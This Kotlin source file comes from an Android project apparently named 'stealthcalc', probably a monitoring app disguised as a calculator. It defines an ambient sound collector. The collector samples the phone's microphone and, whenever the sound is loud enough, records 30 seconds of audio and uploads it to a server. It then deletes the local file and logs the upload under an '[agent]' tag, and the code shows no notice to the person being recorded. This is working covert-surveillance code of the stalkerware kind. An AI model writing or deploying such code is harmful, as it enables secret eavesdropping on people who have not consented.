package com.stealthcalc.monitoring.collector

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.AmbientSoundPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import com.stealthcalc.monitoring.network.FileUploader
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.delay
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class AmbientSoundCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val uploader: FileUploader,
) {
    companion object {
        private const val THRESHOLD_AMPLITUDE = 5000
        private const val SAMPLE_DURATION_MS = 3000L
        private const val RECORD_DURATION_MS = 30_000L
    }

    suspend fun collect() {
        if (!repository.isMetricEnabled("ambient_sound")) return

        val recorder = createRecorder() ?: return
        val tempFile = File(context.cacheDir, "ambient_probe.m4a")

        runCatching {
            recorder.setOutputFile(tempFile.absolutePath)
            recorder.prepare()
            recorder.start()

            delay(SAMPLE_DURATION_MS)

            val peak = recorder.maxAmplitude
            recorder.stop()
            recorder.release()
            tempFile.delete()

            val payload = Json.encodeToString(
                AmbientSoundPayload(
                    peakAmplitude = peak,
                    durationMs = SAMPLE_DURATION_MS,
                    triggered = peak > THRESHOLD_AMPLITUDE,
                    timestampMs = System.currentTimeMillis(),
                )
            )
            repository.recordEvent(MonitoringEventKind.AMBIENT_SOUND, payload)

            if (peak > THRESHOLD_AMPLITUDE) {
                recordAndUpload()
            }
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "Ambient sound error: ${e.message}")
            runCatching { recorder.release() }
            tempFile.delete()
        }
    }

    private suspend fun recordAndUpload() {
        val recorder = createRecorder() ?: return
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val file = File(context.cacheDir, "ambient_$timestamp.m4a")

        runCatching {
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()

            delay(RECORD_DURATION_MS)

            recorder.stop()
            recorder.release()

            val success = uploader.uploadFile(
                file = file,
                mimeType = "audio/mp4",
                category = "ambient_sound",
                capturedAt = System.currentTimeMillis(),
            )
            file.delete()

            if (success) {
                AppLogger.log(context, "[agent]", "Ambient sound recording uploaded (${RECORD_DURATION_MS / 1000}s)")
            }
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "Ambient record error: ${e.message}")
            runCatching { recorder.release() }
            file.delete()
        }
    }

    private fun createRecorder(): MediaRecorder? {
        return runCatching {
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION") MediaRecorder()
            }
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(64_000)
            recorder.setAudioSamplingRate(22_050)
            recorder
        }.getOrNull()
    }
}
